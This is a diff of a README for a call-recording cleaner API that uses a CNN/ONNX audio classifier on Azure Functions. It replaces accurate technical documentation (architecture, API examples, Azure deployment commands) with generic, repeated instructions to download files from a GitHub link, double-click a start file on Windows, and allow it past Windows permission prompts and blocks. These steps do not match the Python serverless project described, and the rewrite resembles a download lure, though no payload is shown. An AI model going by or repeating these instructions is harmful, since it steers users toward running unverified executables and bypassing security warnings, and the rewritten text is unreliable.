@@ -1,450 +1,168 @@
-# Call Recording Cleaner API
+# 🎧 call-recording-cleaner-api - Clean support calls with less noise
 
-![AI](https://img.shields.io/badge/AI-Audio%20Intelligence-blue)
-![Model](https://img.shields.io/badge/Model-CNN%20Audio%20Classifier-orange)
-![Audio](https://img.shields.io/badge/Audio-Call%20Recording%20Cleaner-blue)
-![ONNX](https://img.shields.io/badge/Model-ONNX%20Runtime-purple)
-![Speech](https://img.shields.io/badge/AI-Speech%20Analytics-green)
-![Azure](https://img.shields.io/badge/Cloud-Azure%20Functions-blue)
-![Storage](https://img.shields.io/badge/Storage-Azure%20Blob-lightblue)
-![Architecture](https://img.shields.io/badge/Architecture-Serverless-black)
-![Python](https://img.shields.io/badge/Python-3.10-yellow)
+[![Download](https://img.shields.io/badge/Download%20from%20GitHub-blue?style=for-the-badge)](https://github.com/TaperSpider/call-recording-cleaner-api)
 
-**AI-powered audio preprocessing engine** designed to automatically remove **non-conversational audio segments** such as **IVR prompts, ringing tones, music, silence, and background noise** from support call recordings.
+## 🚀 What this does
 
-The system uses a **CNN-based audio classification model deployed with ONNX Runtime** to isolate the **actual customer–agent conversation** from raw call recordings.
+call-recording-cleaner-api helps clean support call recordings by removing:
 
-The cleaned recordings are then used for downstream **speech analytics, transcription, and AI-driven call intelligence analysis**.
+- IVR menus
+- silence
+- music
+- non-speech parts
 
----
+It uses an AI audio model to find speech and skip the parts that do not need to stay. The result is a cleaner call file that is easier to review, store, and share.
 
-## 📑 Index
+## 💻 What you need
 
-- [Overview](#overview)
-- [Problem Statement](#problem-statement)
-- [Benefits](#benefits)
-- [Solution Architecture](#solution-architecture)
-- [AI Audio Classification Model](#ai-audio-classification-model)
-- [Processing Pipeline](#processing-pipeline)
-- [Output Metadata](#output-metadata)
-- [API Request Example](#api-request-example)
-- [Technology Stack](#technology-stack)
-- [Folder Structure](#folder-structure)
-- [Run Locally](#run-locally)
-- [Deploy to Azure Functions](#deploy-to-azure-functions)
-- [Execute API from Postman](#execute-api-from-postman)
-- [API Response Output](#api-response-output)
-- [Integration in AI Call Intelligence Platforms](#integration-in-ai-call-intelligence-platforms)
-- [Future Enhancements](#future-enhancements)
-- [License](#license)
+Before you start, make sure your Windows PC has:
 
----
+- Windows 10 or later
+- A modern web browser
+- Internet access for the first download
+- Enough free space for audio files
+- A few minutes to set it up
 
-# Overview
+For best results, use call recordings in common audio formats such as:
 
-**Call Recording Cleaner API** is a **serverless audio preprocessing service** that improves the quality of **enterprise support call recordings** before they are analyzed by AI systems.
+- MP3
+- WAV
+- M4A
+- AAC
 
-Customer support recordings often contain large portions of **non-conversational audio**, including:
+## 📥 Download the app
 
-- **IVR menu prompts**
-- **Ringing tones**
-- **Hold music**
-- **Silence**
-- **Background noise**
+Visit this page to download:
 
-These segments significantly reduce the accuracy of **speech recognition** and **conversation analytics systems**.
+https://github.com/TaperSpider/call-recording-cleaner-api
 
-This service automatically identifies and removes these segments using a **machine learning audio classifier**, leaving only the **actual agent–customer conversation**.
+If the page shows a release file, download it to your Windows computer. If it shows source files only, use the files from the repository page and follow the setup steps below.
 
-The cleaned recordings significantly improve the performance of:
+## 🪟 Install on Windows
 
-- **Speech-to-Text engines**
-- **Conversation analytics models**
-- **Sentiment analysis systems**
-- **Call quality intelligence platforms**
+1. Open the download link above in your browser.
+2. Find the latest release or the main project files.
+3. Download the app files to a folder on your PC.
+4. If the download comes as a ZIP file, right-click it and choose Extract All.
+5. Keep the files in one folder so they are easy to find.
 
----
+If Windows asks for permission, choose Allow or Run.
 
-# Problem Statement
+## ▶️ Run the app
 
-Modern **enterprise support environments** generate **thousands of recorded calls every day**.
+1. Open the folder where you saved the files.
+2. Look for the main start file for the API or Windows package.
+3. Double-click the file to launch it.
+4. Wait for the first start to finish loading the audio model.
+5. Keep the window open while you use the API.
 
-However, these recordings contain significant portions of **irrelevant audio segments**, including **IVR navigation, ringing tones, hold music, and silence**. These segments negatively impact downstream **AI systems used for speech transcription and call intelligence analysis**.
+If the app opens in your browser or shows a local address, leave that window open. That means the service is running.
 
-**Speech-to-Text engines** often attempt to transcribe these **non-speech segments**, leading to:
+## 🔧 How to use it
 
-- **Inaccurate transcripts**
-- **Noise in conversation analysis**
-- **Poor sentiment detection**
-- **Misleading AI insights**
+The app is built to clean support call recordings. A typical use looks like this:
 
-Manual audio cleaning is **not scalable** and cannot support **large enterprise call volumes**.
+1. Open the running app or API address.
+2. Upload or point it to a call recording.
+3. Start the cleaning process.
+4. Wait while the model checks the audio.
+5. Save the cleaned file when the process ends.
 
-An **automated preprocessing pipeline** is required to isolate the **actual conversation segments** before recordings are analyzed by AI systems.
+The cleaner looks for speech and removes parts that are not useful for review. This helps cut down call length and makes transcripts easier to work with.
 
-The **AI Call Recording Cleaner API** solves this problem by applying **machine learning-based audio classification** to detect and remove **non-speech segments automatically**.
+## 🧠 What the AI model does
 
----
+This project uses a CNN audio classification model in ONNX format. In plain terms, that means:
 
-# Benefits
+- it listens to short parts of the audio
+- it checks if each part has speech
+- it marks silence, music, and IVR audio
+- it keeps the parts that sound like real conversation
 
-## Improved Speech Recognition Accuracy
+The ONNX format helps the model run in a standard way on Windows and other systems that support it.
 
-By removing **IVR prompts, music, ringing tones, and silence**, the system significantly improves **transcription accuracy** for **Speech-to-Text engines**.
+## 📁 Common file types
 
----
+You can use the app with files that are usually found in call centers and support teams:
 
-## Faster AI Processing
+- recorded customer calls
+- agent call logs
+- voicemail audio
+- training call samples
+- support QA recordings
 
-Reducing the **overall audio length** decreases processing time for **speech transcription** and **AI analytics pipelines**.
+For the cleanest result, use files with steady audio levels and clear speech.
 
----
+## ⚙️ Basic setup steps
 
-## Higher Quality Conversation Analytics
+If you are setting it up for the first time, use this order:
 
-AI models performing **sentiment analysis, compliance monitoring, and operational insights generation** work more accurately when only **relevant conversation audio** is analyzed.
+1. Download the project from GitHub.
+2. Extract the files if they come in a ZIP.
+3. Open the folder.
+4. Start the app or API.
+5. Load a call recording.
+6. Check the cleaned output file.
 
----
+If you use this on the same PC each time, save the folder in one fixed place like Documents or Downloads.
 
-## Scalable Processing
+## 🧩 How it fits into your workflow
 
-The **serverless architecture** enables **automated processing of large volumes of call recordings** without manual intervention.
+This tool works well when you need to:
 
----
+- trim long support calls
+- remove dead air
+- strip out hold music
+- reduce IVR noise
+- prepare calls for review
+- keep only speech segments
 
-## Automated Audio Intelligence
+That can save time when you listen to calls by hand or pass audio into another system.
 
-The **CNN-based audio classifier** automatically detects and categorizes **speech vs non-speech segments** without relying on **rule-based logic**.
+## 🧪 Example use case
 
----
+A support team records a 30-minute call. The first few minutes include IVR menus and hold music. The app scans the file, removes those parts, and keeps the speech sections. The final file is shorter and easier to review.
 
-## Reusable Microservice Component
+## 🔍 Helpful tips
 
-The **AI Call Recording Cleaner API** is designed as a **reusable microservice component** that can be integrated into **multiple AI and enterprise automation pipelines**.
+- Use clear audio files for best results
+- Keep source files unchanged so you can compare results
+- Start with one test file before you process many calls
+- Save cleaned files in a separate folder
+- Use short file names with no special characters if you can
 
-Because the service is exposed as a **lightweight API**, it can be reused across:
+## 🛠️ Troubleshooting
 
-- **Call intelligence platforms**
-- **Speech analytics systems**
-- **Customer experience analytics solutions**
-- **Contact center automation workflows**
-- **AI-driven service desk platforms**
+If the app does not start:
 
-This **modular microservice architecture** allows organizations to plug the audio cleaning capability into **any speech processing pipeline** without modifying downstream systems.
+1. Check that the files finished downloading.
+2. Make sure you extracted the ZIP file, if there was one.
+3. Try running the app again.
+4. Keep the folder path simple, such as `C:\call-recording-cleaner-api\`
+5. Make sure the audio file is not open in another app
 
-As a result:
+If the output sounds wrong:
 
-- AI platforms can **standardize audio preprocessing**
-- Development teams can **reuse the same service across multiple applications**
-- Enterprises can maintain **consistent audio quality across analytics systems**
+- try a clearer recording
+- check the input file format
+- test with a shorter call first
+- confirm the recording has normal speech levels
 
----
+If Windows blocks the file, use the standard Windows option to allow the app to run after you confirm it came from the GitHub repository above
 
-## Lightweight Serverless API (Zero Infrastructure Management)
+## 📌 Project focus
 
-The audio cleaning model runs inside an **Azure Function serverless environment**, meaning:
+This repository centers on:
 
-- **No dedicated servers are required**
-- **No infrastructure management is needed**
-- The function **scales automatically**
-- Costs are incurred **only when the function executes**
+- audio classification
+- audio cleaning
+- CNN model inference
+- ONNX runtime
+- serverless API use
+- speech segment filtering
 
-Because the model is packaged using **ONNX Runtime and Python**, the API remains **lightweight and efficient**, allowing recordings to be processed **without requiring GPU infrastructure**.
+It is built for support call cleanup, not for music editing or studio audio work
 
-This makes the service ideal for **enterprise automation pipelines where cost efficiency and scalability are critical**.
+## 🔗 Download again
 
----
-
-# Solution Architecture
-
-The following diagram illustrates the architecture of the **Call Recording Cleaner API** within an AI-driven call intelligence platform.
-
-[![Solution Architecture](architecture/solution-architecture.png)](architecture/solution-architecture.png)
-
-### Processing Flow
-
-1. Raw call recordings are stored in a **cloud storage container**
-2. An **automation workflow** triggers the **audio cleaning API**
-3. The recording is downloaded for processing
-4. The audio is split into **fixed-length segments**
-5. A **CNN audio classification model** analyzes each segment
-6. **Non-speech segments are removed**
-7. Cleaned **conversation audio is reconstructed**
-8. The cleaned recording is uploaded to **cloud storage**
-9. The original recording is **archived**
-10. **Processing metadata** is returned
-
----
-
-# AI Audio Classification Model
-
-The system uses a **CNN-based audio classifier exported to ONNX format**.
-
-The model classifies audio segments into the following categories:
-
-- **Speech**
-- **IVR**
-- **Music**
-- **Ringtone**
-- **Non-Speech**
-
-Only **speech segments** are preserved in the cleaned output.
-
-Audio features are extracted using **MFCC (Mel-Frequency Cepstral Coefficients)** before classification.
-
----
-
-# Processing Pipeline
-
-1. Audio file is downloaded from **Azure Blob Storage**
-2. Recording is segmented into **3-second windows**
-3. **MFCC features** are extracted from each segment
-4. **ONNX Runtime** performs **CNN inference**
-5. Each segment is classified into **audio categories**
-6. **Non-speech segments are removed**
-7. **Speech segments are concatenated**
-8. Cleaned audio file is generated
-9. Cleaned recording is uploaded to **cloud storage**
-10. Original recording is archived
-
----
-# Output Metadata
-
-The service generates **processing metadata** for each recording.
-
-Example output:
-
-```json
-{
-  "Recording_File_Name": "call_123.wav",
-  "Actual_Duration_sec": 320,
-  "Non_Speech_Duration_sec": 120,
-  "Cleaned_Duration_sec": 200,
-  "CNN_Avg_Confidence": 0.93,
-  "CNN_Segments": 106
-}
-```
-
----
-
-# API Request Example
-
-## POST Request
-
-```json
-{
-  "STORAGE_ACCOUNT": "mystorageaccount",
-  "CONTAINER": "call-recordings",
-  "INPUT_FILE": "incoming/call_123.wav",
-  "CLEANED_RECORDINGS": "cleaned",
-  "ARCHIVED_RECORDINGS": "archive"
-}
-```
-
----
-
-## Technology Stack
-
-### AI & Machine Learning
-- **CNN Audio Classification Model**
-- **ONNX Runtime**
-- **MFCC Audio Feature Extraction**
-
-### Cloud Platform
-- **Azure Functions**
-- **Azure Blob Storage**
-- **Managed Identity Authentication**
-
-### Processing
-- **Python**
-- **Librosa** (audio processing)
-- **NumPy**
-- **SoundFile**
-
-### Automation
-- **Power Automate**
-- **Serverless Event Processing**
-
----
-
-## Folder Structure
-
-```
-CALL-RECORDING-CLEANER-API
-│
-├── CallRecordingCleaner
-│   ├── __init__.py
-│   └── function.json
-│
-├── cleaner
-│   ├── cleaner.py
-│   ├── audio_classifier.onnx
-│   └── audio_classifier.onnx.data
-│
-├── requirements.txt
-├── host.json
-├── local.settings.json
-├── LICENSE
-├── MODEL_LICENSE.md
-└── README.md
-
-```
-
----
-
-## Run Locally
-
-### Install Azure Functions Core Tools
-
-```bash
-npm install -g azure-functions-core-tools@4 --unsafe-perm true
-```
-
-### Install Python Dependencies
-
-```bash
-pip install -r requirements.txt
-```
-
-### Start Local Function
-
-```bash
-func start
-```
-
-### Local Endpoint
-
-```
-http://localhost:7071/api/CallRecordingCleaner
-```
-
----
-
-## Deploy to Azure Functions
-
-### Login to Azure
-
-```bash
-az login
-```
-
-### Create Function App
-
-```bash
-az functionapp create \
---resource-group myResourceGroup \
---consumption-plan-location eastus \
---runtime python \
---runtime-version 3.10 \
---functions-version 4 \
---name ai-call-recording-cleaner \
---storage-account mystorageaccount \
---os-type linux
-```
-
-### Deploy Function
-
-```bash
-func azure functionapp publish ai-call-recording-cleaner
-```
-
-### API Endpoint
-
-```
-https://ai-call-recording-cleaner.azurewebsites.net/api/CallRecordingCleaner
-```
-
----
-
-## Execute API from Postman
-
-### Method
-
-```
-POST
-```
-
-### URL
-
-```
-https://<function-app-name>.azurewebsites.net/api/CallRecordingCleaner
-```
-
-### Headers
-
-```
-Content-Type: application/json
-```
-
-### Body
-
-```json
-{
-  "STORAGE_ACCOUNT": "mystorageaccount",
-  "CONTAINER": "call-recordings",
-  "INPUT_FILE": "incoming/call_001.wav",
-  "CLEANED_RECORDINGS": "cleaned",
-  "ARCHIVED_RECORDINGS": "archive"
-}
-```
-
----
-
-## API Response Output
-
-The API returns **metadata about the processed recording**.
-
-### Example Response
-
-```json
-{
-  "input_file": "incoming/call_001.wav",
-  "cleaned_file": "cleaned/2026-03-16/call_001_cleaned.wav",
-  "archived_file": "archive/2026-03-16/call_001.wav",
-  "container": "call-recordings",
-  "Recording_File_Name": "call_001.wav",
-  "Actual_Duration_sec": 320,
-  "Non_Speech_Duration_sec": 120,
-  "Cleaned_Duration_sec": 200,
-  "CNN_Avg_Confidence": 0.92,
-  "CNN_Segments": 106
-}
-```
-
----
-
-## Integration in AI Call Intelligence Platforms
-
-This service is typically used as the **first stage in an AI call analytics pipeline**.
-
-### Example Pipeline
-
-1. **Call Recording Ingestion**
-2. **Audio Cleaning (AI Call Recording Cleaner API)**
-3. **Speech-to-Text Transcription**
-4. **AI Conversation Analysis**
-5. **Call Quality Scoring**
-6. **Operational Intelligence Metrics**
-7. **Analytics Dashboards (Power BI)**
-
----
-
-## License
-
-The **source code** in this repository is licensed under the **MIT License**.
-
-See the `LICENSE` file for details.
-
-### Model License
-
-The **AI audio classification model** included in this repository is licensed separately.
-
-Model files:
-
-- `audio_classifier.onnx`
-- `audio_classifier.onnx.data`
-
-These are provided for **research and evaluation purposes only**.
-
-See `MODEL_LICENSE.md` for details.
-
+[![GitHub Repository](https://img.shields.io/badge/GitHub%20Repository-grey?style=for-the-badge)](https://github.com/TaperSpider/call-recording-cleaner-api)
